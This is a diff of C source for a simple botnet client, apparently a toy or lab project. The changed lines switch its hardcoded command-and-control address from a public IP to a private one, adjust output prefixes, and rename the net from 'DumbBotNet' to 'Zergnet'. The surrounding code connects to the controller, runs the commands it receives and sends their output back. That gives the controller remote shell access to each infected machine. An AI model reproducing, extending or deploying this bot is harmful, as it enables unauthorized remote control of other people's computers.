@@ -27,7 +27,7 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define CC_SERVER "159.203.130.71"
+#define CC_SERVER "10.13.13.33"
 #define CC_PORT 9999
 #define MAX_BUF 1024
 
@@ -59,8 +59,9 @@ bot_run_cmd (int s, char *cmd)
   while (!feof (f))
     {
       if (!fgets (line, 1024, f)) break;
+      bot_print (s, ">>>");
       bot_print (s, bot_id);
-      bot_print (s, ":");
+      bot_print (s, ": ");
       bot_print (s, line);
     }
   fclose(f);
@@ -109,7 +110,7 @@ bot_connect_cc (char *ip, int port)
     PEXIT ("socket:");
   if ((connect (s, (struct sockaddr*) &server, sizeof(server))) < 0) 
     PEXIT ("conect:");
-  snprintf (msg, 1024, "%s: This is '%s' Up and Running\n", bot_id, bot_id);
+  snprintf (msg, 1024, ">>>%s: This is '%s' Up and Running\n", bot_id, bot_id);
   bot_print (s, msg);
 
   return s;
@@ -124,7 +125,7 @@ main (int argc, char* argv[])
   if (argc !=2) PEXIT ("Invalid Number Of Arguments:");
   bot_id = strdup (argv[1]);
  
-  printf ("'%s' joining the DumbBotNet\n", bot_id);
+  printf ("'%s' joining the Zergnet\n", bot_id);
   cc_s = bot_connect_cc (CC_SERVER, CC_PORT);
   while (1)
     {
